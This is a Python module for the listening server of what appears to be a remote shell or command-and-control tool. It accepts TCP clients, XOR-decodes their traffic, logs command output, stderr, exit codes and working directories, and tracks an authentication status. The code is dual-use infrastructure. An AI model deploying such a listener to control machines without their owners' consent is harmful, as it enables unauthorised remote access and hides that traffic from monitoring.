import threading
import socket

from . import config


def set_connected(value):
    if config.is_connected == value:
        return
    config.is_connected = value
    if value:
        config.add_log("🟢 STATUS: CONNECTED")
    else:
        set_authenticated(False)
        config.add_log("🔴 STATUS: DISCONNECTED")


def remove_client(client):
    with config.clients_lock:
        if client in config.clients:
            config.clients.remove(client)
        if len(config.clients) == 0:
            set_connected(False)


def set_authenticated(value):
    if config.is_authenticated == value:
        return
    config.is_authenticated = value
    if value:
        config.add_log("🔐 STATUS: AUTHENTICATED")
    else:
        config.add_log("🔓 STATUS: NOT AUTHENTICATED")


def _process_line(line):
    if line.startswith("STDERR:"):
        config.add_log(line[7:], is_stderr=True)
    else:
        config.add_log(line)


def handle_client(client, address):
    config.add_log(f"[CONNECTED] {address[0]}:{address[1]}")

    with config.clients_lock:
        config.clients.append(client)

    set_connected(True)
    client.settimeout(5.0)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
    client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
    client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)

    try:
        while config.server_running:
            try:
                data = client.recv(4096)
            except socket.timeout:
                continue
            if not data:
                break
            message = config.xor_bytes(data).decode(errors="replace").strip()
            if message:
                if "EXIT:" in message:
                    *body, exit_part = message.rsplit("\n", 1)
                    for line in body:
                        _process_line(line)
                    if exit_part.startswith("EXIT:"):
                        try:
                            parts = exit_part.split()
                            code = int(parts[0].split(":")[1])
                            config.last_exit_code = code
                            if len(parts) > 1 and parts[1].startswith("PWD:"):
                                config.last_pwd = parts[1][4:]
                        except (ValueError, IndexError):
                            config.add_log(exit_part)
                else:
                    _process_line(message)
                    if message == "OK authenticated":
                        set_authenticated(True)
    except OSError:
        config.add_log("[ERROR] recv failed")

    remove_client(client)

    try:
        client.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    try:
        client.close()
    except OSError:
        pass

    config.add_log(f"[DISCONNECTED] {address[0]}:{address[1]}")


def server_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((config.HOST, config.PORT))
    server.listen(5)
    server.settimeout(1)

    config.add_log(f"Listening on {config.HOST}:{config.PORT}")
    config.add_log("🔴 STATUS: DISCONNECTED")

    while config.server_running:
        try:
            client, address = server.accept()
            thread = threading.Thread(target=handle_client, args=(client, address))
            thread.daemon = True
            thread.start()
        except socket.timeout:
            continue
        except OSError:
            break

    server.close()


def close_clients():
    with config.clients_lock:
        for client in config.clients:
            try:
                client.close()
            except OSError:
                pass
        config.clients.clear()
    set_authenticated(False)
    set_connected(False)
